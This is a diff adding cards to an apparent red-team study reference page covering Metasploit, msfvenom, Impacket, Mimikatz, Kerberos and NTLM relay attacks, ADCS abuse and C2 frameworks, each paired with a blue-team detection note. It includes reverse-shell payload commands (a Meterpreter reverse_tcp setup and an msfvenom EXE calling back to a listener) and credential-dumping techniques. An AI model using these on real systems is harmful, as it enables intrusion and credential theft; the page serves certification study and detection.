@@ -457,4 +457,479 @@
             </div>
           </div>
 
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🧨</span>
+              <span class="topic-name">Metasploit Framework — Modules, Sessions &amp; Workflow</span>
+              <span class="topic-badge">Exploitation</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">The Standard Exploitation Framework</div>
+                <div class="concept-desc">
+                  Metasploit bundles thousands of exploits, payloads, and post-exploitation modules
+                  behind one workflow — the core tool for the exploitation phase and a PenTest+/OSCP
+                  staple. <em>Authorized targets only; every module here is for permission-based
+                  testing.</em>
+                </div>
+                <div class="dw">
+                  <div class="dt">▸ MODULE TYPES</div>
+                  <table class="ref-table" style="margin-bottom:14px">
+                    <tr><th>Type</th><th>Does</th></tr>
+                    <tr><td class="c-cyan">exploit</td><td>Delivers a payload via a vulnerability</td></tr>
+                    <tr><td class="c-cyan">payload</td><td>Code that runs post-exploit (e.g. Meterpreter)</td></tr>
+                    <tr><td class="c-cyan">auxiliary</td><td>Scanners, fuzzers, no payload</td></tr>
+                    <tr><td class="c-cyan">post</td><td>Post-exploitation (loot, pivot, persist)</td></tr>
+                    <tr><td class="c-cyan">encoder</td><td>Obfuscate payloads past simple filters</td></tr>
+                  </table>
+                  <div class="dt">▸ CONSOLE WORKFLOW</div>
+<pre class="code-block"><span class="fn">msfconsole</span>
+msf&gt; search type:exploit smb
+msf&gt; use exploit/windows/smb/...
+msf&gt; show options
+msf&gt; set RHOSTS <span class="num">10.0.0.5</span>
+msf&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf&gt; set LHOST <span class="num">10.0.0.1</span>
+msf&gt; run                        <span class="com"># → opens a session on success</span>
+msf&gt; sessions -i <span class="num">1</span>              <span class="com"># interact with session 1</span></pre>
+                  <div class="concept-desc" style="margin-top:8px">
+                    <strong class="c-amber">Blue-team note:</strong> default Meterpreter and
+                    stock modules have well-known signatures — EDR and AV catch them readily.
+                    Detection maps directly to ATT&amp;CK exploitation + C2 techniques.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">📦</span>
+              <span class="topic-name">msfvenom — Payload Generation</span>
+              <span class="topic-badge">Exploitation</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Standalone Payloads in Any Format</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">msfvenom</strong> generates payloads outside the console —
+                  an executable, script, or shellcode you deliver during an authorized engagement
+                  (e.g. a reverse shell for a lab box you've been scoped to test). It pairs a
+                  payload with an output format and optional encoders.
+                </div>
+                <div class="dw">
+<pre class="code-block"><span class="com"># Windows reverse-shell EXE (lab/authorized use)</span>
+<span class="fn">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="num">10.0.0.1</span> LPORT=<span class="num">4444</span> -f exe -o shell.exe
+
+<span class="com"># List payloads / formats</span>
+<span class="fn">msfvenom</span> --list payloads
+<span class="fn">msfvenom</span> --list formats</pre>
+                  <table class="ref-table" style="margin-top:10px">
+                    <tr><th>Flag</th><th>Meaning</th></tr>
+                    <tr><td><code>-p</code></td><td>Payload</td></tr>
+                    <tr><td><code>-f</code></td><td>Output format (exe, elf, raw, python, …)</td></tr>
+                    <tr><td><code>-e</code> / <code>-i</code></td><td>Encoder &amp; iterations (basic evasion)</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:8px">
+                    <strong class="c-amber">Blue-team note:</strong> the LHOST/LPORT callback is
+                    the tell — outbound connections to an unusual host/port right after a file
+                    executes. Egress filtering + EDR behavioral rules catch it.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🗃️</span>
+              <span class="topic-name">Searchsploit &amp; Exploit-DB — Finding Public Exploits</span>
+              <span class="topic-badge">Exploitation</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Match a Version to a Known Exploit</div>
+                <div class="concept-desc">
+                  Once enumeration gives you exact software versions, the question is: is there a
+                  public exploit? <strong class="c-cyan">Exploit-DB</strong> is the archive;
+                  <strong class="c-cyan">searchsploit</strong> is its offline CLI (ships with Kali).
+                  <em>Vet before you run</em> — public PoCs can be broken, or booby-trapped.
+                </div>
+                <div class="dw">
+<pre class="code-block"><span class="fn">searchsploit</span> apache 2.4          <span class="com"># find exploits for a version</span>
+<span class="fn">searchsploit</span> -x php/webapps/1234  <span class="com"># view the exploit source</span>
+<span class="fn">searchsploit</span> -m php/webapps/1234  <span class="com"># copy it locally to inspect/edit</span></pre>
+                  <div class="concept-desc" style="margin-top:8px">
+                    <strong class="c-amber">Blue-team note:</strong> this is why
+                    <strong class="c-green">version-hiding + fast patching</strong> matter — the
+                    entire chain is "know the version → look up the exploit." Remove version banners
+                    and keep software current.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🐍</span>
+              <span class="topic-name">Impacket — The Windows/AD Python Toolkit</span>
+              <span class="topic-badge">Exploitation</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Speak Windows Protocols From Linux</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">Impacket</strong> is a collection of Python scripts that
+                  implement Windows network protocols (SMB, Kerberos, MSRPC) — the backbone of
+                  hands-on Active Directory testing. It lets you move laterally, dump creds, and
+                  execute commands with credentials you've legitimately obtained during an
+                  engagement. <em>Authorized AD environments only.</em>
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Script</th><th>Does</th></tr>
+                    <tr><td><code>psexec.py</code></td><td>Command execution over SMB (SYSTEM shell)</td></tr>
+                    <tr><td><code>wmiexec.py</code></td><td>Quieter command exec via WMI</td></tr>
+                    <tr><td><code>secretsdump.py</code></td><td>Dump hashes (SAM, LSA, NTDS.dit)</td></tr>
+                    <tr><td><code>GetUserSPNs.py</code></td><td>Kerberoasting — request service tickets</td></tr>
+                    <tr><td><code>ntlmrelayx.py</code></td><td>Relay captured NTLM auth to other hosts</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team note:</strong> these leave clear Windows
+                    Event Log traces — service creation (7045) for psexec, ticket requests (4769)
+                    for Kerberoasting, unusual SMB auth patterns for relay. Sysmon + a SIEM rule per
+                    technique catches them.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🩸</span>
+              <span class="topic-name">BloodHound &amp; SharpHound — Attack-Path Graphing</span>
+              <span class="topic-badge">AD Attacks</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">"Who Can Reach Domain Admin, and How?"</div>
+                <div class="concept-desc">
+                  Active Directory permissions form a graph so complex no human can audit it by eye.
+                  <strong class="c-cyan">SharpHound</strong> (the collector) enumerates users,
+                  groups, sessions, and ACLs; <strong class="c-cyan">BloodHound</strong> loads that
+                  into a graph DB and finds the <em>shortest path</em> from a low-priv foothold to
+                  Domain Admin. <em>Authorized AD assessments only.</em>
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Concept</th><th>Detail</th></tr>
+                    <tr><td class="c-cyan">Collection</td><td>SharpHound gathers sessions, ACLs, group membership, GPOs</td></tr>
+                    <tr><td class="c-cyan">Edges</td><td>Relationships like <code>MemberOf</code>, <code>AdminTo</code>, <code>GenericAll</code>, <code>HasSession</code></td></tr>
+                    <tr><td class="c-cyan">Pre-built queries</td><td>"Shortest path to Domain Admins", "Kerberoastable users"</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team note:</strong> defenders run BloodHound too —
+                    it's the best way to <em>find and cut</em> those paths before an attacker walks
+                    them. Collection generates heavy LDAP/SMB queries that anomaly detection can flag.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🔓</span>
+              <span class="topic-name">Mimikatz — Credential Extraction</span>
+              <span class="topic-badge">AD Attacks</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">The Tool That Redefined AD Security</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">Mimikatz</strong> extracts plaintext passwords, hashes, and
+                  Kerberos tickets from Windows memory (LSASS), and forges tickets. It's the canonical
+                  post-exploitation credential tool — understanding it is essential for both attack
+                  and defense. <em>Authorized, lab, and cert-prep contexts only.</em>
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Technique</th><th>What</th></tr>
+                    <tr><td class="c-cyan">sekurlsa::logonpasswords</td><td>Dump creds/hashes from LSASS memory</td></tr>
+                    <tr><td class="c-cyan">Pass-the-Hash</td><td>Authenticate with an NTLM hash — no password needed</td></tr>
+                    <tr><td class="c-cyan">Pass-the-Ticket</td><td>Reuse a stolen Kerberos ticket</td></tr>
+                    <tr><td class="c-red">Golden Ticket</td><td>Forge a TGT with the krbtgt hash — domain-wide persistence</td></tr>
+                    <tr><td class="c-cyan">DCSync</td><td>Impersonate a DC to pull password hashes via replication</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team note:</strong> defenses are
+                    <strong class="c-green">Credential Guard</strong> (protects LSASS), LSASS-access
+                    alerts (Sysmon event 10), disabling NTLM where possible, and watching for
+                    anomalous replication (DCSync = event 4662 from a non-DC).
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🎟️</span>
+              <span class="topic-name">Kerberos Attacks — Rubeus &amp; Kerbrute</span>
+              <span class="topic-badge">AD Attacks</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Abusing the Ticket System</div>
+                <div class="concept-desc">
+                  Kerberos is AD's auth protocol — and its ticketing has abusable quirks.
+                  <strong class="c-cyan">Rubeus</strong> is the Swiss-army knife for ticket attacks;
+                  <strong class="c-cyan">Kerbrute</strong> does fast username enumeration and
+                  password spraying against the KDC. <em>Authorized environments only.</em>
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Attack</th><th>Idea</th></tr>
+                    <tr><td class="c-cyan">Kerberoasting</td><td>Request service tickets (SPNs), crack them offline for the service account password</td></tr>
+                    <tr><td class="c-cyan">AS-REP Roasting</td><td>Accounts with "no pre-auth" leak a crackable hash without any creds</td></tr>
+                    <tr><td class="c-cyan">Password spray</td><td>One password against many users (avoids lockout)</td></tr>
+                    <tr><td class="c-red">Silver Ticket</td><td>Forge a service ticket with a service account hash</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team note:</strong> Kerberoasting shows as a spike
+                    of TGS requests (event 4769) for many SPNs from one user. Defenses: long,
+                    random service-account passwords (or gMSAs), and enabling Kerberos pre-auth.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🕸️</span>
+              <span class="topic-name">Responder &amp; NTLM Relay</span>
+              <span class="topic-badge">AD Attacks</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Poison the LAN, Capture the Auth</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">Responder</strong> answers broadcast name-resolution
+                  requests (LLMNR/NBT-NS/mDNS) that Windows sends when DNS fails — tricking hosts into
+                  authenticating to the attacker and leaking NetNTLM hashes. Combined with
+                  <strong class="c-cyan">ntlmrelayx</strong>, the captured auth is
+                  <em>relayed</em> to another host to gain access without ever cracking a hash.
+                  <em>Authorized internal engagements only.</em>
+                </div>
+                <div class="dw">
+                  <div class="concept-desc">
+                    <strong class="c-amber">Blue-team note:</strong> this is one of the most common
+                    real-world internal footholds. Defenses are concrete and high-impact:
+                    <strong class="c-green">disable LLMNR and NBT-NS</strong> via GPO, enforce
+                    <strong class="c-green">SMB signing</strong> (breaks relay), and segment the
+                    network. Detection: a host suddenly answering name queries for everything.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">📜</span>
+              <span class="topic-name">ADCS Abuse — Certipy &amp; the ESC Techniques</span>
+              <span class="topic-badge">AD Attacks</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">When the Certificate Authority Becomes the Backdoor</div>
+                <div class="concept-desc">
+                  Active Directory Certificate Services (ADCS) issues certs — and misconfigured
+                  templates let a low-priv user request a certificate that authenticates <em>as
+                  someone else</em>, up to Domain Admin. <strong class="c-cyan">Certipy</strong>
+                  finds and exploits these (the "ESC1–ESC8" family). It's become one of the most
+                  impactful AD attack classes. <em>Authorized assessments only.</em>
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Step</th><th>Detail</th></tr>
+                    <tr><td class="c-cyan">Find</td><td><code>certipy find</code> — enumerate templates &amp; flag vulnerable ones</td></tr>
+                    <tr><td class="c-red">ESC1</td><td>Template lets requester supply the subject → request a cert as any user</td></tr>
+                    <tr><td class="c-cyan">Authenticate</td><td>Use the cert to get a TGT / NTLM hash for that identity</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team note:</strong> audit certificate templates
+                    (remove "enrollee supplies subject" + client-auth combos), monitor the CA's
+                    issuance logs, and restrict enrollment rights. Certipy's own <code>find</code>
+                    is the fastest way for defenders to spot the misconfig first.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">📻</span>
+              <span class="topic-name">C2 Concepts — Beacons, Listeners &amp; Redirectors</span>
+              <span class="topic-badge">C2</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">How Operators Control an Authorized Foothold</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">Command &amp; Control (C2)</strong> is how a red-team
+                  operator communicates with an implant on a compromised host during an authorized
+                  engagement. Understanding the architecture is essential for blue teams — it's the
+                  <strong class="c-amber">most-detected</strong> phase of an attack, and maps to
+                  MITRE ATT&amp;CK's Command &amp; Control tactic. <em>Reference for authorized
+                  red-team / CRTO-style cert prep and detection engineering.</em>
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Term</th><th>Role</th></tr>
+                    <tr><td class="c-cyan">Implant / Beacon</td><td>Code on the host that calls back for tasking</td></tr>
+                    <tr><td class="c-cyan">Listener / Team Server</td><td>The operator side the implant connects to</td></tr>
+                    <tr><td class="c-cyan">Redirector</td><td>A relay that hides the real team server</td></tr>
+                    <tr><td class="c-cyan">Beacon interval / jitter</td><td>How often (and how randomly) it checks in</td></tr>
+                    <tr><td class="c-cyan">Channel</td><td>HTTPS, DNS, SMB — how tasking is carried</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team detection:</strong> beaconing shows up as
+                    <em>regular, periodic</em> outbound connections to one destination — even over
+                    HTTPS, the timing pattern betrays it. Zeek/SIEM analytics on connection
+                    intervals, JA3/TLS fingerprints, and newly-seen domains are the classic catches.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">⚔️</span>
+              <span class="topic-name">Cobalt Strike — The Commercial Standard</span>
+              <span class="topic-badge">C2</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Know It Because Everyone Detects It</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">Cobalt Strike</strong> is the long-standing commercial
+                  red-team platform — its "Beacon" implant, malleable C2 profiles, and post-ex
+                  tooling set the template the whole field copies. It's also
+                  <strong class="c-red">heavily abused by real threat actors</strong> (cracked
+                  versions), which is exactly why defenders study it so closely.
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Feature</th><th>What</th></tr>
+                    <tr><td class="c-cyan">Beacon</td><td>The implant; HTTP/S, DNS, SMB channels</td></tr>
+                    <tr><td class="c-cyan">Malleable C2</td><td>Profiles that reshape traffic to blend in</td></tr>
+                    <tr><td class="c-cyan">Team server</td><td>Multi-operator collaboration</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team detection:</strong> default Beacon has
+                    well-known signatures — named pipes, the "jQuery" malleable profile, specific
+                    memory artifacts, and default TLS certs. Tools like BeaconHunter and JA3/JA3S
+                    fingerprinting, plus memory scanning (YARA rules for Beacon), catch stock
+                    configs readily. This is a study/detection reference, not an operator manual.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🦠</span>
+              <span class="topic-name">Sliver — The Open-Source Modern C2</span>
+              <span class="topic-badge">C2</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">The Free Alternative Red Teams Adopted</div>
+                <div class="concept-desc">
+                  <strong class="c-cyan">Sliver</strong> (BishopFox) is a popular open-source,
+                  cross-platform C2 framework — a common Cobalt Strike alternative for budgets and
+                  labs. It supports multiple transports (mTLS, HTTP/S, DNS, WireGuard) and
+                  per-operation compiled implants. Defenders track it because its adoption (by both
+                  red teams and adversaries) is rising fast.
+                </div>
+                <div class="dw">
+                  <div class="concept-desc">
+                    <strong class="c-amber">Blue-team detection:</strong> the community has published
+                    Sliver-specific indicators — default implant characteristics, certificate
+                    patterns, and traffic signatures — as YARA and Suricata rules. The general
+                    principle holds: any C2's <em>beaconing behavior</em> is detectable even when
+                    static signatures aren't, so behavioral analytics matter most.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="topic">
+            <div class="topic-header">
+              <span class="topic-icon">🧩</span>
+              <span class="topic-name">Mythic, Havoc &amp; Empire — The C2 Ecosystem</span>
+              <span class="topic-badge">C2</span>
+              <span class="topic-chev">▶</span>
+            </div>
+            <div class="topic-body">
+              <div class="concept-card">
+                <div class="concept-label">Reference</div>
+                <div class="concept-title">Know the Landscape</div>
+                <div class="concept-desc">
+                  Beyond Cobalt Strike and Sliver, several open frameworks round out what red teams
+                  and CTF players use — and what defenders must recognize.
+                </div>
+                <div class="dw">
+                  <table class="ref-table">
+                    <tr><th>Framework</th><th>Character</th></tr>
+                    <tr><td class="c-cyan">Mythic</td><td>Modular, multi-agent, web-UI collaboration platform</td></tr>
+                    <tr><td class="c-cyan">Havoc</td><td>Modern open-source C2 with a Cobalt-Strike-like UI</td></tr>
+                    <tr><td class="c-cyan">PowerShell Empire / Starkiller</td><td>Classic PowerShell/Python post-ex C2 (Starkiller = GUI)</td></tr>
+                    <tr><td class="c-cyan">Metasploit / Meterpreter</td><td>Also a C2 for lighter engagements (see the exploitation card)</td></tr>
+                  </table>
+                  <div class="concept-desc" style="margin-top:10px">
+                    <strong class="c-amber">Blue-team takeaway:</strong> the tools change, the
+                    <em>behavior</em> doesn't — implant → periodic callback → tasking → post-ex.
+                    Detection engineering built on ATT&amp;CK techniques (C2 over web protocols,
+                    DNS, encrypted channels) generalizes across all of them, unlike per-tool
+                    signatures.
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
 <!-- /domain-body redteam -->
